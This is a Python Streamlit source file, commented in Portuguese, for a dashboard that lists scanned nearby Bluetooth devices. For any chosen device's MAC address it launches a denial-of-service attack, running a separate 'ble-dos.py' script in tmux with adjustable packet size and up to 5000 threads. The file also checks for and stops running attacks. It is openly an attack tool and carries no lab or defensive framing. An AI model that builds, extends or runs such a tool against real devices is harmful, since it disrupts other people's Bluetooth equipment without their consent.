import streamlit as st
import json
from datetime import datetime
import subprocess
import sys

# Função para carregar os dispositivos do arquivo JSON
def load_devices():
    try:
        with open('bluetooth_devices.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

# Função para formatar a data
def format_date(date_str):
    return datetime.strptime(date_str, '%Y-%m-%d %H:%M:%S.%f')

# Função para verificar se há uma sessão de ataque em andamento no tmux
def is_attack_running():
    try:
        result = subprocess.run(['tmux', 'list-sessions'], capture_output=True, text=True)
        return 'ble-dos' in result.stdout
    except Exception as e:
        st.error(f"[!] ERROR: {str(e)}")
        return False

# Função para iniciar um ataque
def start_attack(mac_address, packet_size, thread_count):
    try:
        # Executa o script ble-dos.py em uma nova sessão tmux
        subprocess.run(['tmux', 'new-session', '-d', '-s', 'ble-dos', sys.executable, 'ble-dos.py', mac_address, str(packet_size), str(thread_count)])
        st.success(f"[*] Ataque iniciado contra {mac_address} com pacotes de {packet_size} bytes usando {thread_count} threads.")
    except Exception as e:
        st.error(f"[!] ERROR ao iniciar o ataque: {str(e)}")

# Função para parar o ataque
def stop_attack():
    try:
        subprocess.run(['tmux', 'kill-session', '-t', 'ble-dos'])
        st.success("[*] Ataque interrompido.")
    except Exception as e:
        st.error(f"[!] ERROR ao parar o ataque: {str(e)}")

# Carregar dispositivos
devices = load_devices()

# Título da aplicação
st.title("Dispositivos Bluetooth Encontrados")

# Slider para filtrar pelo número de dispositivos a serem exibidos
count_limit = st.slider(
    "Selecione o número de dispositivos a exibir:",
    min_value=15,
    max_value=150,
    value=15,
    step=1,
    format="%d"
)

# Sliders para definir tamanho do pacote e quantidade de threads
packet_size = st.slider(
    "Tamanho do pacote (bytes):",
    min_value=1,
    max_value=5000,
    value=64,  # Valor padrão
)

thread_count = st.slider(
    "Quantidade de threads:",
    min_value=1,
    max_value=5000,
    value=10,  # Valor padrão
)

# Verificar se há um ataque em andamento
attack_running = is_attack_running()

if attack_running:
    st.markdown("<h5 style='color: green;'>Ataque em andamento!</h5>", unsafe_allow_html=True)

# Botão para parar o ataque se estiver em andamento
if attack_running and st.button("Parar Ataque"):
    stop_attack()

# Filtrando e ordenando dispositivos com base na última vez encontrado
filtered_devices = {
    addr: info for addr, info in devices.items()
}

# Ordena os dispositivos pela última vez encontrado (mais recente primeiro)
sorted_devices = sorted(filtered_devices.items(), key=lambda item: format_date(item[1]['last_found']), reverse=True)

# Limita a quantidade de dispositivos a ser exibida
sorted_devices = sorted_devices[:count_limit]

# Exibir resultados filtrados
if sorted_devices:
    for addr, info in sorted_devices:
        with st.expander(info['name'] if info['name'] else addr):
            st.write(f"**Nome:** {info['name']}")
            st.write(f"**Endereço MAC:** {addr}")
            st.write(f"**Primeira vez encontrado:** {info['first_found']}")
            st.write(f"**Última vez encontrado:** {info['last_found']}")

            # Botão para atacar com os parâmetros definidos pelo usuário
            if st.button("Atacar", key=addr):
                start_attack(addr, packet_size, thread_count)
else:
    st.write("Nenhum dispositivo encontrado.")